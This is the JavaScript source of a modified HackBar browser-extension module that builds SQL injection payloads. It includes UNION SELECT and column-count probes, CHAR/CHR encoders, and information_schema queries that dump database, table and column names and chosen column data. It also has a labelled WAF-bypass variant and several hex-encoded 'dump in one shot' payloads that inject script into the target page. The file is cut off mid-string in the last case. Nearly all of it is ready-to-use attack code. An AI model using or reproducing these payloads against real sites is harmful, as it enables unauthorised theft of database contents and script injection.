HackBar.SQL = {
  selectionToSQLChar: function ( dbEngine )
  {
    var charStringArray = new Array();
    var txt = hackBar.getSelectedText();
    var decimal;
    for ( var c = 0 ; c < txt.length ; c++ ) {
      decimal = txt.charCodeAt( c );
      charStringArray.push( decimal );
    }
    var charString = '';
    switch ( dbEngine )
    {
      case "mysql":
        charString = 'CHAR(' + charStringArray.join(', ') + ')';
        break;
      case "mssql":
        charString = ' CHAR(' + charStringArray.join(') + CHAR(') + ')';
        break;
      case "oracle":
        charString = ' CHR(' + charStringArray.join(') || CHR(') + ')';
        break;
    }
    hackBar.setSelectedText( charString );
  },
  selectionToUnionSelect: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the UNION SELECT Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = "+UNION+ALL+SELECT+" + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  /* GENERAL FUNCTIONS */
  selectionMySQLConvertUsing: function ( encoding )
  {
    var txt = hackBar.getSelectedText();
    txt = "CONVERT(" + txt + " USING " + encoding + ")";
    hackBar.setSelectedText( txt );
  },		
  /*########################################################################
	#						MOD'S BY T.PROSPECT                            #
    #                            01/2014                                   #
    ######################################################################## 
	
	
	/* T.PRO FUNCTION */
	WichField: function (choice){	
		var str = choice;
		switch (str){					
			case 'main_toogle':  
					document.getElementById(str).setAttribute("checked",true);
					document.getElementById('ref_toogle').setAttribute("checked",false);	
					document.getElementById('post_toogle').setAttribute("checked",false);
					document.getElementById('base_toogle').setAttribute("checked",false);					
					break;	
			case 'ref_toogle':  
					document.getElementById(str).setAttribute("checked",true);
					document.getElementById('main_toogle').setAttribute("checked",false);	
					document.getElementById('post_toogle').setAttribute("checked",false);
					document.getElementById('base_toogle').setAttribute("checked",false);	
					break;
			case 'post_toogle':  
					document.getElementById(str).setAttribute("checked",true);
					document.getElementById('ref_toogle').setAttribute("checked",false);	
					document.getElementById('main_toogle').setAttribute("checked",false);
					document.getElementById('base_toogle').setAttribute("checked",false);		
					break;	
			case 'base_toogle':  
					document.getElementById(str).setAttribute("checked",true);				
					document.getElementById('ref_toogle').setAttribute("checked",false);	
					document.getElementById('post_toogle').setAttribute("checked",false);
					document.getElementById('main_toogle').setAttribute("checked",false);	
					break;
            default:
                    txt = "ERROR";
                    break;					
		}			
	},
	ResizeText: function (multiplier){		
	if (document.getElementById('hackBarTargetUrl').style.fontSize == "") {
		document.getElementById('hackBarTargetUrl').style.fontSize = "12px";		
	}
	document.getElementById('hackBarTargetUrl').style.fontSize = parseFloat(document.getElementById('hackBarTargetUrl').style.fontSize) + (multiplier * 1) + "px";	
	},
    ExecuteReplace: function (){
		if(document.getElementById('main_toogle').checked){txt = 'hackBarTargetUrl'};
		if(document.getElementById('ref_toogle').checked){txt = 'hackBarTargetUrlReferrerField'};
		if(document.getElementById('post_toogle').checked){txt = 'hackBarTargetUrlPostField'};
		if(document.getElementById('base_toogle').checked){txt = 'hackBarTargetUrlBase64Field'};
		
		ActiveQuery = document.getElementById(txt).value;
		if(ActiveQuery == ''){
		alert('No query found!(empty URL-FIELDS)\nPlease type in a query or deselect "all" checkbox and give a string in replace-input-field!')
		}else{
		// get query to replace
		ReplaceQuery = document.getElementById(txt).value;
		ReplaceQuery = encodeURIComponent(ReplaceQuery);
		// var UserInput = '%20';
		var UserInput = document.getElementById('rstring1').value;
		var UserInput = encodeURIComponent(UserInput);
		// get replace string input from user
		var InserString = document.getElementById('rstring2').value;
		var InserString = encodeURIComponent(InserString);
		var oldWordRegEx = new RegExp(UserInput,'g');
		var result = ReplaceQuery.replace(oldWordRegEx,InserString);		
		alert(result);		
		};		
	},	
	ToHex: function (string){				
		var charStringArray = new Array;
		var decimal;
		for ( var c = 0 ; c < string.length ; c++ ) {
		  decimal = string.charCodeAt( c );
		  charStringArray.push( HackBar.Toolbox.dec2hex( decimal ) );	  
		}
		string = charStringArray.join( '' ); 		
		return(string);				
	},	
	FromHex: function (string){				
		var string = string.toLowerCase();
		string = string.replace( /%/g, '' );
		string = string.replace( /[^0-9abcdefg]/g, '' );

		var charStringArray = new Array();
		var buffer = '';
		var result = '';
		for ( var c = 0 ; c < string.length ; c++ ) {
		  buffer += string.charAt( c ).toString();
		  if ( buffer.length >= 2 ) {
			result += String.fromCharCode( HackBar.Toolbox.hex2dec( buffer ) );
			buffer = '';
		  }
		}   		
		return(result);			
	},
	ExecuteReplaceTest: function (){
		// get active field
		if(document.getElementById('main_toogle').checked){txt = 'hackBarTargetUrl'};
		if(document.getElementById('ref_toogle').checked){txt = 'hackBarTargetUrlReferrerField'};
		if(document.getElementById('post_toogle').checked){txt = 'hackBarTargetUrlPostField'};			
		var ReplaceQuery = document.getElementById(txt).value;
		
		var ReplaceQuery = ReplaceQuery.replace( new RegExp(/\n/g), '[X]' );
		var ReplaceQuery = ReplaceQuery.replace( new RegExp(/\r/g), '[Y]' );

		
		var UserInput = document.getElementById('rstring1').value;		
		var InserString = document.getElementById('rstring2').value;
		// check if "all" checkbox is checked
		if(document.getElementById('replace_check').checked){
			// check if fields are filled		
			if(ReplaceQuery == '' && UserInput == '' && InserString == ''){			
				alert('[Replace Error-Message #1]\n\nPlease enter:\n1) Query field!\n2) Replace string!\n3) Replacing string!')
			};
			// check if fields are filled		
			if(ReplaceQuery != '' && UserInput == '' && InserString == ''){			
				alert('[Replace Error-Message #2]\n\nPlease enter:\n1) Replace string!\n2) Replacing string!')
			};
			if(ReplaceQuery != '' && UserInput != '' && InserString == ''){			
				alert('[Replace Error-Message #3]\n\nPlease enter:\nReplacing string!')
			}
			if(ReplaceQuery != '' && UserInput == '' && InserString != ''){			
				alert('[Replace Error-Message #4]\n\nPlease enter:\nReplace string!')
			}
			if(ReplaceQuery == '' && UserInput != '' && InserString == ''){			
				alert('[Replace Error-Message #5]\n\nPlease enter:\nReplacing string!')
			}
			if(ReplaceQuery == '' && UserInput == '' && InserString != ''){			
				alert('[Replace Error-Message #6]\n\nPlease enter:\n1) Query field!\n2) Replace string!')
			}
			if(ReplaceQuery == '' && UserInput != '' && InserString != ''){			
				alert('[Replace Error-Message #7]\n\nPlease enter:\n1) Query field!')
			}
			if(ReplaceQuery != '' && UserInput != '' && InserString != ''){			
				//fields to hex
				var UserInput = HackBar.SQL.ToHex(UserInput);
				var InserString = HackBar.SQL.ToHex(InserString); 		
				var ReplaceQuery = HackBar.SQL.ToHex(ReplaceQuery);	
				// Regex with hex
				var oldWordRegEx = new RegExp(UserInput,'g');
				var result = ReplaceQuery.replace(oldWordRegEx,InserString);
				var result = HackBar.SQL.FromHex(result);
				// replaced hex result to string
				var result = result.replace( new RegExp(/\[X]/g), '\n' );
				var result = result.replace( new RegExp(/\[Y]/g), '\r' );
				document.getElementById(txt).value = result;
			};					
		}else{	
			var UserInput = document.getElementById('rstring1').value;		
			var InserString = document.getElementById('rstring2').value;
			// check if fields are filled		
			if(UserInput == '' && InserString == ''){			
				alert('[Replace Error-Message #1]\n\nPlease enter:\n1) Replace string!\n2) Replacing string!')
			};
			if(UserInput != '' && InserString == ''){			
				alert('[Replace Error-Message #1]\n\nPlease enter:\n1) Replacing string!')
			};
			if(UserInput == '' && InserString != ''){			
				alert('[Replace Error-Message #1]\n\nPlease enter:\n1) Replace string!')
			};			
			if(UserInput != '' && InserString != ''){			
				var ReplaceQuery = hackBar.getSelectedText();
				if(ReplaceQuery == ""){alert('[Replace Error-Message]\n\nMarked text is empty!\nPlease mark a text or select "all" checkbox for replacing in whole query!')};				
				//fields to hex
				var UserInput = HackBar.SQL.ToHex(UserInput);
				var InserString = HackBar.SQL.ToHex(InserString); 		
				var ReplaceQuery = HackBar.SQL.ToHex(ReplaceQuery);	
				// Regex with hex
				var oldWordRegEx = new RegExp(UserInput,'g');
				var result = ReplaceQuery.replace(oldWordRegEx,InserString);
				var result = HackBar.SQL.FromHex(result);
				hackBar.setSelectedText( result );
			};	
		};					
	},
	  /* T.PRO STATEMENTS FUNCTION */
      statementsTpro: function (choice)	{
		var str = choice;
		switch (str){
			case '1': txt = "CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())";
					break;		
			case '4': 
					var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{
                        // Convert DB name to hex
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + dbNameFinal + ")";
					break;
			case '5': txt = "+ORDER+BY+1";
					break;
			case '6':
                    var columns = 100;
                    columns = Math.min(1000, parseInt( columns ));
                    var colArray = new Array();
                    for ( var i = 0 ; i < columns ; i++ ) {
                      colArray.push( i+1 );
                    }
                    txt = "+GROUP+BY+" + colArray.join( ',' );
                    break;
			case '7': 
					var tblName = prompt("Table name","");
                    var tblNameFinal = "0x";
                    if(tblName == ""){tblNameFinal="[INSERT_TABLE]";}
                    else{
                        // Convert DB name to hex
                        for (var i = 0; i < tblName.length; i++){
                          tblNameFinal += tblName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=" + tblNameFinal + ")";
					break;
			case '8': txt = "+PROCEDURE+ANALYSE()";
					break;
			case '9': var txt = hackBar.getSelectedText();
					txt = "'+AND+(SELECT * FROM " + txt + ")=(SELECT 1)--+";
					break;
			case '10': 
					var tblName = prompt("Table name","");
                    var tblNameFinal = "0x";
                    if(tblName == ""){tblNameFinal="[INSERT_TABLE]";}
                    else{
                        // Convert DB name to hex
                        for (var i = 0; i < tblName.length; i++){
                          tblNameFinal += tblName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=" + tblNameFinal + ")AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)";
					break;
			case '11': 
					var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
					var table = prompt("Insert table name","TABLE_NAME to dump");
					var cols = prompt("Insert columns to dump","column_1,column_2,column_3");					
					if(Db == ""){dbANDtable=table;}
					if(Db == "DATABASE()"){dbANDtable=table;}
					else{
					dbANDtable=Db + "." + table;					
					}
					txt = "(SELECT+GROUP_CONCAT(" + cols + "+SEPARATOR+0x3c62723e)+FROM+" + dbANDtable + ")";
					break;
			case '12': 
			        var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
					var table = prompt("Insert table name","TABLE_NAME to dump");
					var cols = prompt("Insert columns to dump","column_1,column_2,column_3");					
					if(Db == ""){dbANDtable=table;}
					if(Db == "DATABASE()"){dbANDtable=table;}
					else{
					dbANDtable=Db + "." + table;					
					}					
					txt = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + dbANDtable + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + cols + ",0x3c62723e))))x)";
					break;
			case '13': 			       				
					txt = "[BASE64]=INSERT_STRING_HERE]";
					break;
			case '14':
					txt = "(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))";
					break;
			case '15':
					var dbName = prompt("Database Name","database()");
                    var dbNameFinal = "0x";
                    if(dbName == "database()"){dbNameFinal="database()";}
                    else{
                        // Convert DB name to hexa
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    txt = "(select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name+separator+0x3c62723e)from+information_schema.columns+where+table_schema=Database()+and+table_name=@tbl)))))x)";
                    break;
			case '16':
					txt = "(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))";
					break;
			case '17':
					txt = "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)";
					break;
			case '18':
					txt = "concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)";
					break;
			case '19':
					txt = "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/";
					break;
			case '20':  txt = "export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)";
					break;
			case '21':  txt = "+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+";
					break;
			case '22':  txt = "concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)";
					break;
			case '23':
						txt = "(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+ifnull(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)";
					break;
			case '24':
						txt = "concat%280x3c2f686561643e3c626f6479206267636f6c6f72203d20626c61636b3e3c62723e3c68313e7e3a20496e6a65637465642042792048656c6c657220485348203a7e3c2f68313e3c62723e3c666f6e742073697a653d3620636f6c6f723d677265656e3e4461746162617365203a20,database%28%29,0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f72203d2079656c6c6f772073697a653d363e2055534552203a20,user(),0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d7265642073697a653d373e20486176652053796d6c696e6b203f203a20,@@HAVE_SYMLINK,0x203c2f666f6e743e3c62723e3c666f6e742073697a65203d203520636f6c6f72203d2079656c6c6f773e20486f73746e616d65203a20,@@HOSTNAME,0x3c6469763e3c666f6e7420636f6c6f723d207265643e3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3c2f6469763e3c2f666f6e743e3c2f666f6e743e3c68333e3c666f6e7420636f6c6f72203d726564203e44617461626173657320616e6420436f6c756d6e7320496e666f20203a203c62723e3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e,%28SELECT%28@y%29FROM%28SELECT%28@y:=0x00%29,%28@NR:=0%29,%28SELECT%280%29FROM%28INFORMATION_SCHEMA.SCHEMATA%29WHERE%28SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461%29AND%280x00%29IN%28@y:=CONCAT%28@y,LPAD%28@NR:=@NR%2b1,2,0x30%29,0x3a20,schema_name,0x3c62723e%29%29%29%29y%29,0x3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d353e2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d7e7e7e7e7e7e7e2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3c2f666f6e743e3c62723e,%28select%28@x%29from%28select%28@x:=0x00%29,%28@nr:=0%29,(@tbl:=0x0%29,%28select%280%29from%28information_schema.tables%29where%28table_schema=database%28%29%29and%280x00%29in%28@x:=concat_ws%280x20,@x,lpad%28@nr:=@nr%2b1,3,0x0b%29,0x2e203c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d79656c6c6f773e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,%28select+count%28*%29+from+information_schema.columns+where+table_name=@tbl%29,0x3c2f666f6e743e5d20207d3c2f666f6e743e3c62723e%29%29%29%29x%29,0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d352e333e3d3d3d3d3d7e7e7e7e7e4853487e7e7e7e7e3d3d3d3d3d4853483d3d3d3d3d7e7e7e7e7e4853483d3d3d3d3d7e7e7e7e7e4853487e7e7e7e7e3d3d3d3d3d4853483d3d3d3d3d7e7e7e7e7e4853483c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d79656c6c6f772073697a653d343e4578747261637465642044617461203a203c2f666f6e743e3c62723e3c68313e7e3a2048454c4c45522028204853482029205741532048455245203a7e3c2f68313e203c62723e3c64697620616c69676e3d226c656674223e,%28select+concat%280x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e546f74616c20436f6c756d6e20436f756e7420416c6c20446174616261736573203a7e2048454c4c455227532044494f53207e5b,%28Select+count%28column_name%29from%28information_Schema.columns%29%29,0x5d3c62723e3c62723e2f7e,@%29from%28select%28@:=0x00%29,%28@db:=0%29,%28@db_nr:=0%29,%28@tbl:=0%29,%28@tbl_nr:=0%29,%28@col_nr:=0%29,%28select%28@%29from%28information_Schema.columns%29where%28@%29in%28@:=concat%28@,if%28%28@db!=table_schema%29,concat%28%28@tbl_nr:=0x00%29,0x3c666f6e7420636f6c6f723d7265643e,LPAD%28@db_nr:=@db_nr%2b1,2,0x20%29,0x2e20,@db:=table_schema,0x203c666f6e7420636f6c6f723d707572706c653e207e3a205461626c657320436f756e7420546f74616c203a7e202848454c4c455227732044494f5329205b,%28Select+count%28table_name%29from%28information_schema.tables%29where%28table_schema=@db%29%29,0x5d2f7e3c2f666f6e743e3c2f666f6e743e%29,0x00%29,if%28%28@tbl!=t